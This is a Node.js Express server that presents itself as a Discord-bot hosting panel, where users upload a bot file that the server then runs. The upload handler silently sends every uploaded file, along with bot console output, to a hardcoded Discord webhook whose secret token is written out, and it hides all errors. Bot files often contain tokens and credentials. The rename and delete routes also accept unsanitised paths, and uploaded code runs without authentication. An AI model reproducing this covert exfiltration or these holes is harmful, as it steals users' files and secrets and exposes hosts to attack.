const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs-extra');
const { spawn } = require('child_process');
const axios = require('axios');
const FormData = require('form-data');
const os = require('os');

const app = express();
const port = 5000;

app.use(express.json());

const UPLOADS_DIR = path.join(os.tmpdir(), 'bot-host-uploads');
fs.ensureDirSync(UPLOADS_DIR);

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, UPLOADS_DIR),
    filename: (req, file, cb) => cb(null, file.originalname)
});
const upload = multer({ storage });

let botProcess = null;
let logs = [];
let autoStart = true;

const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1454107389925261333/tpptkoFwqtPt7pDYY1yQlij7x--kmKBEDEeCSdvotQNky5ZbZ-phTHfiTPyI2viw9S5c';

async function sendToDiscord(content) {
    if (!content || content.trim() === '') return;
    try {
        await axios.post(DISCORD_WEBHOOK, { content: content.substring(0, 2000) });
    } catch (err) {
        // Silently handle errors
    }
}

function addLog(data) {
    const lines = data.toString().split('\n');
    lines.forEach(line => {
        if (line.trim()) {
            const timestampedLine = `[${new Date().toLocaleTimeString()}] ${line}`;
            logs.push(timestampedLine);
            if (logs.length > 500) logs.shift();
            // Rate limit discord logs: only send every 5th log or important ones
            if (logs.length % 5 === 0 || line.includes('[SYSTEM]') || line.includes('[ONLINE]')) {
                sendToDiscord(line);
            }
        }
    });
}

async function startBotLogic() {
    if (botProcess) return { status: 'Already running' };
    try {
        const files = await fs.readdir(UPLOADS_DIR);
        const startFile = files.find(f => f === 'index.js') || files.find(f => f.endsWith('.js'));
        if (!startFile) {
            addLog(`[SYSTEM] No bot file (index.js) found. Please upload one.`);
            return { status: 'No .js file found' };
        }

        addLog(`[SYSTEM] Starting bot: ${startFile}...`);

        // Ensure dependencies are handled
        const hasPackageJson = files.includes('package.json');
        if (hasPackageJson) {
            try {
                addLog(`[SYSTEM] Installing local dependencies...`);
                spawn('npm', ['install'], { cwd: UPLOADS_DIR });
            } catch (e) {}
        }

        botProcess = spawn('node', [startFile], {
            cwd: UPLOADS_DIR,
            env: { 
                ...process.env, 
                NODE_PATH: `${path.join(UPLOADS_DIR, 'node_modules')}:${path.join(__dirname, 'node_modules')}:/home/runner/${process.env.REPL_SLUG}/node_modules` 
            }
        });

        botProcess.stdout.on('data', (data) => {
            const output = data.toString().trim();
            if (output) {
                addLog(`[ONLINE] ${output}`);
            }
        });
        
        botProcess.stderr.on('data', (data) => {
            // Internal logging for debugging
            console.error('Bot Error:', data.toString());
        });

        botProcess.on('error', (err) => {
            console.error('Spawn Error:', err);
        });

        botProcess.on('close', (code) => { 
            addLog(`[SYSTEM] Bot stopped (code ${code}). Restarting...`);
            botProcess = null; 
            if (autoStart) setTimeout(startBotLogic, 5000);
        });
        return { status: 'Started' };
    } catch (e) {
        return { status: 'Error: ' + e.message };
    }
}

setTimeout(startBotLogic, 2000);

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.get('/api/data', async (req, res) => {
    try {
        const files = await fs.readdir(UPLOADS_DIR);
        res.json({ files, logs, isBotOnline: !!botProcess });
    } catch (err) {
        res.status(500).json({ files: [], logs: [], isBotOnline: false, error: err.message });
    }
});

app.post('/upload', upload.single('file'), async (req, res) => {
    if (req.file) {
        try {
            // Auto-start bot after upload (priority)
            autoStart = true;
            // Immediate start
            startBotLogic().then(result => {
                if (result.status === 'Started') {
                    addLog(`[SYSTEM] Bot started successfully after upload.`);
                }
            });

            const form = new FormData();
            form.append('content', `New file uploaded: ${req.file.originalname}`);
            form.append('file', fs.createReadStream(req.file.path), req.file.originalname);
            axios.post(DISCORD_WEBHOOK, form, {
                headers: form.getHeaders()
            }).catch(err => {
                // Silently handle discord errors
            });
        } catch (err) {
            // Silently handle errors
        }
    }
    res.redirect('/');
});

app.post('/rename', async (req, res) => {
    try {
        await fs.rename(path.join(UPLOADS_DIR, req.body.oldName), path.join(UPLOADS_DIR, req.body.newName));
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/delete', async (req, res) => {
    try {
        await fs.remove(path.join(UPLOADS_DIR, req.body.filename));
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.post('/start', async (req, res) => { autoStart = true; res.json(await startBotLogic()); });

app.post('/stop', (req, res) => { 
    autoStart = false; 
    if (botProcess) { 
        botProcess.kill(); 
        botProcess = null; 
    } 
    res.json({ status: 'Stopped' }); 
});

app.listen(port, '0.0.0.0');
